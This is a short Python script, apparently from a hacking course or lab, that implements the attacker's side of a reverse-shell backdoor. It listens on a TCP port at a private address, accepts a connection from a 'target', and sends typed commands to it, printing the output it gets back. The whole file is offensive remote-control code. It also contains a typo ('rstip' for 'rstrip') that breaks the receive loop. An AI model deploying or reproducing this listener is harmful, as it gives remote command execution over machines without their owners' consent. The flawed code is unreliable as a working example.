# -*- coding: utf-8 -*-
"""
Created on Sat Sep 10 16:20:30 2022

@author: dawid
"""

import socket
import json





def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
    

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstip() # we try to get 1024 bytes from our target, we add it to the previous data we received 
            return json.loads(data)
        except ValueError:
            continue
            


def target_communication():
    while True:
        command = input('* Shell~%s: ' %str(ip))
        reliable_send(command)  # sending the command to the target
        if command == 'quit':
            break
        else: 
            result = reliable_recv()  # storing the response of the command 
            print(result)
            






sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # specifying the estabilishment of IPv4 connection and declaration of TCP use 
sckt.bind(('192.168.32.130', 5555))
print('Listening for the incoming connections')
sckt.listen(5)
target, ip = sckt.accept()
print('Target connected from ' + str(ip))
target_communication()  # Sending commands to the target system to execute and receive the response from the target system
